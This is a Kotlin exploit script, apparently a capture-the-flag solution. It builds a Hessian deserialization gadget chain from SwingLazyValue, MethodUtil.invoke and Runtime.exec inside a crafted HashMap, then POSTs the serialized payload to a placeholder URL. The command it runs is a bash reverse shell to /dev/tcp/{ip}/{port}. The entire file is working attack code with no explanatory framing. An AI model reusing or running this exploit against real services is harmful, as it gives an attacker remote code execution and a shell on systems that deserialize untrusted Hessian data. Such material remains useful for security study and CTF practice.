package soln

import com.caucho.hessian.io.Hessian2Output
import org.joor.Reflect
import sun.reflect.misc.MethodUtil
import sun.swing.SwingLazyValue
import java.io.ByteArrayOutputStream
import java.lang.reflect.Method
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import javax.swing.UIDefaults

fun main() {
    send("{url}", createGadget(6, 17))
}

fun send(url: String, target: Any) {
    val bytes = ByteArrayOutputStream().also {
        Hessian2Output(it).run {
            serializerFactory.isAllowNonSerializable = true
            writeObject(target)
            flush()
        }
    }.toByteArray()
    val connection = URL(url).openConnection() as HttpURLConnection
    connection.run {
        requestMethod = "POST"
        doOutput = true
        outputStream.write(bytes)
        outputStream.flush()
        inputStream.reader(StandardCharsets.UTF_8).readText().also(::println)
    }
}

private const val cmd = "bash -c \$@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1"

private fun createGadget(invokeSlot: Int, execSlot: Int): Any {
    val invokeMethod = MethodUtil::class.java.getMethod(
        "invoke",
        Method::class.java, Any::class.java, emptyArray<Any>().javaClass
    ).also { Reflect.on(it).set("slot", invokeSlot) }
    val execMethod = Runtime::class.java.getMethod(
        "exec",
        String::class.java
    ).also { Reflect.on(it).set("slot", execSlot) }
    val args = arrayOf<Any>(execMethod, Runtime.getRuntime() as Any, arrayOf<Any>(cmd))
    val value = SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", arrayOf(invokeMethod, Any(), args))
    val u1 = UIDefaults().apply { put("_", value) }
    val u2 = UIDefaults().apply { put("_", value) }
    val hashMap = HashMap<Any, Any>()
    val rNode = Reflect.onClass("java.util.HashMap\$Node")
    val array = java.lang.reflect.Array.newInstance(rNode.get(), 2)
    java.lang.reflect.Array.set(array, 0, rNode.create(0, u1, null, null).get())
    java.lang.reflect.Array.set(array, 1, rNode.create(0, u2, null, null).get())
    Reflect.on(hashMap).set("size", 2).set("table", array)
    return hashMap
}
